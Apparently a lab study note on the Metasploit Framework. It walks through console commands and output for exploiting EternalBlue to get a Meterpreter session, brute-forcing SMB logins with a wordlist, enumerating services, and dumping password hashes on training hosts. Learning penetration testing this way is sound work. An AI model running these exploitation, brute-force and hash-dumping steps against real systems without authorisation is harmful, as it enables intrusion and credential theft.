# Metasploit

A practical, hands-on overview of the Metasploit Framework—its components,
common workflows, and real console examples.

> **Tip:** Use collapsible sections below to keep long outputs tidy on GitHub.

## Table of Contents

- [Metasploit](#metasploit)
  - [Table of Contents](#table-of-contents)
  - [Main Components of Metasploit](#main-components-of-metasploit)
    - [Key Terms](#key-terms)
    - [Module Types](#module-types)
  - [Initial Setup](#initial-setup)
  - [Using Metasploit](#using-metasploit)
    - [Common Options](#common-options)
    - [Unset \& Global Options (`setg`)](#unset--global-options-setg)
  - [Searching \& Info](#searching--info)
  - [Walkthroughs \& Examples](#walkthroughs--examples)
    - [EternalBlue (MS17-010)](#eternalblue-ms17-010)
    - [Port \& Service Discovery](#port--service-discovery)
    - [SMB Login Brute Force (Scanner)](#smb-login-brute-force-scanner)
    - [NetBIOS Enumeration](#netbios-enumeration)
    - [HTTP Version Detection](#http-version-detection)
    - [Finding Files with Meterpreter](#finding-files-with-meterpreter)
  - [Notes \& Good Practice](#notes--good-practice)

---

## Main Components of Metasploit

- **msfconsole**: The main command-line interface for interacting with
  Metasploit.
- **Modules** (building blocks):
  - **Exploits**: Code that leverages vulnerabilities on target systems.
  - **Auxiliary**: Scanners, crawlers, fuzzers, etc.
  - **Payloads**: Code executed on the target after exploitation (e.g., reverse
    shell).
  - **Encoders**: Obfuscate payloads to evade signature-based detection.
  - **Evasion**: Modules designed to bypass security mechanisms.
  - **NOPs**: “No Operation” instructions used as buffers in payloads.
  - **Post**: Post-exploitation modules for actions after gaining access.
- **Tools**: Stand-alone utilities for payload generation and exploit
  development.
  - Examples: `msfvenom` (payload generation), `pattern_create`,
    `pattern_offset` (exploit dev).

> _This module covers `msfvenom`; the pattern tools are helpful for exploit
> development._

### Key Terms

- **Exploit**: Code that takes advantage of a vulnerability on the target.
- **Vulnerability**: A flaw in design, code, or logic that can be exploited.
- **Payload**: The code delivered by an exploit to achieve a goal (shell,
  command exec, etc.).

### Module Types

Under **payloads** you’ll see four directories:

- **adapters**: Wrap single payloads into different formats (e.g., PowerShell
  one-liner).
- **singles**: Self-contained payloads that don’t fetch additional components.
- **stagers**: Set up a comms channel to deliver a larger **stage**.
- **stages**: The larger functionality downloaded by the stager.

---

## Initial Setup

```bash
msfupdate
msfconsole
```

<details>
<summary><strong>Sample output (collapsed)</strong></summary>

```bash
root@ip-10-10-63-107:~# msfupdate
# ... GPG key warning example ...
metasploit-framework is already the newest version (6.4.55~20250326102656~1rapid7-1)
```

```text
=[ metasploit v6.4.55-dev- ]
- -- --=[ 2502 exploits - 1287 auxiliary - 431 post ]
- -- --=[ 1616 payloads - 49 encoders - 13 nops ]
- -- --=[ 9 evasion ]
Metasploit Documentation: https://docs.metasploit.com/
```

```bash
msf6 > ls
msf6 > ping -c 1 8.8.8.8
msf6 > history
```

</details>

---

## Using Metasploit

### Common Options

- **RHOSTS**: Target host(s). Supports single IP, CIDR (`/24`), ranges (`x–y`),
  or file: `file:/path/to/targets.txt`.
- **RPORT**: Target service port.
- **PAYLOAD**: Payload to use with an exploit.
- **LHOST**: Your attacking host IP (listener).
- **LPORT**: Your listener port.
- **SESSION**: Session ID (for post-exploitation modules).

### Unset & Global Options (`setg`)

- Set a value: `set <NAME> <VALUE>`
- Clear one: `unset <NAME>`
- Clear all: `unset all`
- Global default: `setg <NAME> <VALUE>` (applies across modules)

---

## Searching & Info

```bash
msf6 > search type:auxiliary ssh_login
msf6 > info auxiliary/scanner/ssh/ssh_login
```

<details>
<summary><strong>Example: SSH Login Check Scanner (collapsed)</strong></summary>

```text
Name: SSH Login Check Scanner
Module: auxiliary/scanner/ssh/ssh_login
Rank: Normal
Options:
  RHOSTS (required), RPORT (22), USER_FILE, PASS_FILE, ...
Description:
  Tests SSH logins on a range of machines and reports successful logins.
References:
  https://nvd.nist.gov/vuln/detail/CVE-1999-0502
```

</details>

---

## Walkthroughs & Examples

### EternalBlue (MS17-010)

```bash
msf6 > setg RHOSTS 10.10.226.222
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > exploit -z
msf6 exploit(...) > sessions
msf6 exploit(...) > sessions -i 1
meterpreter >
```

<details>
<summary><strong>Full console output (collapsed)</strong></summary>

```text
[+] Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 SP1 x64
[*] Meterpreter session 1 opened (10.10.63.107:4444 -> 10.10.226.222:49176)
...
```

</details>

---

### Port & Service Discovery

Search for scanners:

```bash
msf6 > search portscan
```

Use the TCP port scanner:

```bash
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > show options
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > set PORTS 1-10000
msf6 auxiliary(...) > run
```

Run `nmap` from inside `msfconsole`:

```bash
msf6 > nmap -sS 10.10.108.124
```

<details>
<summary><strong>Sample Nmap output (collapsed)</strong></summary>

```text
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
```

</details>

---

### SMB Login Brute Force (Scanner)

```bash
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > set SMBUser penny
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
msf6 auxiliary(...) > run
```

<details>
<summary><strong>Result snippet (collapsed)</strong></summary>

```text
[+] 10.10.108.124:445 - Success: '.\penny:leo1234'
[_] ... Bruteforce completed, 1 credential was successful.
```

</details>

---

### NetBIOS Enumeration

```bash
msf6 > use auxiliary/scanner/netbios/nbname
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > run
```

<details>
<summary><strong>Sample output (collapsed)</strong></summary>

```text
[+] 10.10.108.124 [] OS:Unix Names:(**MSBROWSE**, , ACME IT SUPPORT) Mac:00:00:00:00:00:00
```

</details>

---

### HTTP Version Detection

```bash
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(...) > set RHOSTS 10.10.108.124
msf6 auxiliary(...) > set RPORT 8000
msf6 auxiliary(...) > run
```

<details>
<summary><strong>Sample output (collapsed)</strong></summary>

```text
[+] 10.10.108.124:8000 webfs/1.21 (403-Forbidden)
```

</details>

---

### Finding Files with Meterpreter

```bash
meterpreter > pwd
meterpreter > search -f flag.txt
meterpreter > cd C:\Users\Jon\Documents
meterpreter > dir
meterpreter > cat flag.txt
```

<details>
<summary><strong>Sample output (collapsed)</strong></summary>

```text
Found 1 result
c:\Users\Jon\Documents\flag.txt  Size: 15
THM-5455554845
```

You can also dump hashes (requires appropriate privileges):

```bash
meterpreter > hashdump
```

```text
Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:...:8ce9a3ebd1647fcc5e04025019f4b875:::
```

</details>

---

## Notes & Good Practice

- Most exploits have a default payload; list alternatives with `show payloads`.
- Use `info` (or `info -d`) to view full module details and references.
- Prefer **verification** modules (e.g., checks) before exploitation.
- Keep `setg` values tidy (`unsetg` by clearing with `unset` or new session) to
  avoid accidental reuse.
- Respect scopes, legal boundaries, and engagement rules at all times.
